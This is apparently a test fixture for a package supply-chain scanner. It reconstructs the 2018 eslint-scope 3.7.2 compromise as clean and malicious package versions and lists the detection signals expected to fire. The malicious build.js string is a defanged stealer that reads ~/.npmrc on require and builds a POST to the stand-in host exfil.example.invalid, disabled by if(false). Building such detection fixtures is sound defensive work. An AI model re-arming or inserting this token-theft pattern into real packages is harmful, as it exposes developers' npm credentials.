/**
 * eslint-scope 3.7.2 (2018) — T1 maintainer takeover.
 *
 * Attacker gained npm publish rights to eslint-scope via credential theft
 * elsewhere in the ecosystem. Published 3.7.2 (a legitimate 3.7.1 -> 3.7.2 bump).
 * The malicious build.js contained a payload that ran when the package was
 * required (not at install-time) — it read ~/.npmrc, decoded the _authToken,
 * and POSTed it to a pastebin-style dump endpoint.
 *
 * Detectable signals (defanged fixture below preserves them):
 *   - NEW fs.readFile of ~/.npmrc (hot-path FS)
 *   - NEW require('http')
 *   - NEW exfil URL
 *   - OBF: entropy jump / minification regression (real payload was minified)
 */

import type { FixtureSpec } from '../fixture-spec.js';

const CLEAN_INDEX = `// eslint-scope 3.7.1 — real scope analyzer, stubbed for corpus.
'use strict';
module.exports = require('./lib/index.js');
`;

const CLEAN_LIB = `'use strict';
function analyze(ast) { return { scopes: [] }; }
module.exports = { analyze };
`;

const MAL_BUILD = `// eslint-scope 3.7.2 build.js — DEFANGED reconstruction.
// The real payload ran at require() time (see 2018 postmortems).
'use strict';
var fs = require('fs');
var os = require('os');
var http = require('http');
var path = require('path');
function trySteal() {
  try {
    var rcPath = path.join(os.homedir(), '.npmrc');
    var content = fs.readFileSync(rcPath, 'utf8');
    var body = { npmrc: content };
    if (false) {
      var req = http.request({ hostname: 'exfil.example.invalid', port: 80, path: '/dump', method: 'POST' });
      req.end(JSON.stringify(body));
    }
    return body;
  } catch (e) { return null; }
}
trySteal();
module.exports = { _internal: trySteal };
`;

const MAL_INDEX = `'use strict';
require('./build.js');
module.exports = require('./lib/index.js');
`;

// A minified-looking string that would trip our OBF entropy detector
// (real payload was minified; we mimic that shape).
const MAL_LIB = `'use strict';var a=function(t){return{scopes:[]}};function b(x){var y='YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXpBQkNERUZHSElKS0xNTk9QUVJTVFVWV1hZWiswLzE4NDk1MDIzNDU2Nzg5';return y.length}exports.analyze=a;exports._b=b;`;

export const spec: FixtureSpec = {
  id: 'eslint-scope-2018',
  title: 'eslint-scope 3.7.2 (July 2018)',
  year: 2018,
  threatClass: 'T1 maintainer takeover',
  summary:
    'Attacker used stolen npm publish credentials to publish eslint-scope 3.7.2. The build.js payload read ~/.npmrc at require-time and exfiltrated the _authToken to an attacker endpoint. First widely-noticed npm supply-chain compromise.',
  provenance: 'RECONSTRUCTED',
  topology: 'direct',
  clean: {
    name: 'eslint-scope',
    version: '3.7.1',
    manifest: {
      name: 'eslint-scope',
      version: '3.7.1',
      main: 'index.js',
      license: 'BSD-2-Clause',
      maintainers: [{ email: 'nzakas@eslint.example' }],
    },
    files: {
      'index.js': CLEAN_INDEX,
      'lib/index.js': CLEAN_LIB,
    },
  },
  malicious: {
    name: 'eslint-scope',
    version: '3.7.2',
    manifest: {
      name: 'eslint-scope',
      version: '3.7.2',
      main: 'index.js',
      license: 'BSD-2-Clause',
      maintainers: [{ email: 'nzakas@eslint.example' }], // maintainer unchanged in real case
      _npmUser: { name: 'attacker-account', email: 'attacker@example.invalid' },
    },
    files: {
      'index.js': MAL_INDEX,
      'build.js': MAL_BUILD,
      'lib/index.js': MAL_LIB,
    },
  },
  expect: {
    mustFire: [
      'fs.new-hotpath-read',    // read of ~/.npmrc — the eslint-scope 2018 signature
      'net.new-endpoint',
      'net.new-module',
      'obf.entropy-jump',
      'meta.maintainer-change',
    ],
    verdict: 'BLOCK',
    minCategories: ['NET', 'OBF', 'FS'],
  },
};
